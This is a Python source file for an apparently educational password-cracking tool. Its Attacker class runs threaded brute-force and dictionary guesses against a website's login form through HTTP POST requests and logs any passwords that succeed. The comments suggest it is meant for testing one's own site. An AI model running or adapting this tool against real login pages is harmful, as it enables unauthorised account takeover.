from PasswordCracker.PasswordAttackTypes import BruteForceAttack, DictionaryAttack

import requests
import time
import threading


class Attacker():
    def __init__(self, loginURL, logoutURL, formTags=None, attackMethods=None):

        # url of the login page
        self.loginURL = loginURL

        # url of logout page
        self.logoutURL = logoutURL

        # Layout of the login form. You can check this through inspect element.
        # Or if you built the website you can check the code!
        self.formTags = formTags or ["Username", "Password"]
        # By default this is set to:
        # {
        #   "Username" : "dummy",
        #   "Password" : "dummy"
        # }

        # list of attack methods
        # You can write your own class but it must contain a generatePasswords() method that returns an iterator of guesses
        self.attackMethods = attackMethods or {"BruteForceAttack":BruteForceAttack(),
                                               "DictionaryAttack":DictionaryAttack()}

    # TODO: implement threading
    # runs attack on the website.
    # successful is a function that the user provides that returns whether the login succeeded or not.
    # def successful(response) -> Boolean
    # this will change for depending on how the website is constructed. For mine just check that "HELLO" is present in response.content
    def runAttack(self, checkSuccess, attackMethods=None, username=None,
                  findAll=False, testMode=True, verbose=False, log=False):
        print("ATTACKING", self.loginURL)

        # can specify which attack methods to use
        # if not specified, use all that are loaded in
        if not attackMethods:
            attackMethods = [name for name in self.attackMethods]

        threads = []
        for name, attackMethod in self.attackMethods.items():

            # skip if we don't want to run a particular mode
            if name not in attackMethods:
                continue

            result = []
            thread = threading.Thread(name=name, target=self.attack, args=
            (checkSuccess, name, attackMethod, username, findAll, testMode, verbose, log, result))

            threads.append([thread, result])
            thread.start()

        for thread, _ in threads:
            thread.join()

        for thread, result in threads:
            print("====================================================================")
            print("%s found %d passwords:" % (thread.getName(), len(result)))
            print("====================================================================")

            for pw in result:
                print(pw)


    def attack(self, checkSuccess, name, attackMethod, username, findAll, testMode, verbose, log, foundPasswords):

        with requests.Session() as session:
            count = 0

            # if we are logging, override the old log file
            if log:
                with open(name + ".txt", 'w') as file:
                    file.write("%s\n\n" % str(attackMethod))

            startTime = time.time()

            # logging if needed
            with open(name + ".txt", 'a') as file:


                # loop through passwords and try them all
                for password in attackMethod.generatePasswords():
                    count += 1
                    if count%100000 == 0:
                        print(count)
                    if testMode:
                        if verbose:
                            print("TEST MODE: generated password [%s]" % password)
                        continue

                    # if username is not passed as argument, we will use the password as our username
                    data = self.getDataFields(username, password)

                    try:
                        response = session.post(self.loginURL, data=data)
                        found = checkSuccess(response)
                    except Exception as e:
                        print(e)
                        continue

                    if verbose:
                        print("%s Trying [%s] ... %s" % (name, password, "SUCCESS" if found else "FAILED"))

                    if found:
                        file.write(password + "\n")

                        if not verbose:
                            print("%s Found [%s]" % (name, password))
                        foundPasswords.append(password)

                        # if we are just brute forcing a single username exit after we found it
                        if not findAll:
                            break

                        # logout so we can login again
                        session.get(self.logoutURL)

                results = "%s generated %d passwords in %s ms. Found %d password:" \
                          % (name, count, time.time() - startTime, len(foundPasswords))

                # log results
                if log:
                    file.write(results)

    def getDataFields(self, username, password):

        # if username not supplied, we will assume it is the same as password
        return {
            self.formTags[0]:username or password, # form id for username
            self.formTags[1]:password # form id for password
        }

    def addAttackMethod(self, method):
        self.attackMethods[type(method).__name__] = method

    def getAttackMethod(self, method):
        if method in self.attackMethods:
            return self.attackMethods[method]

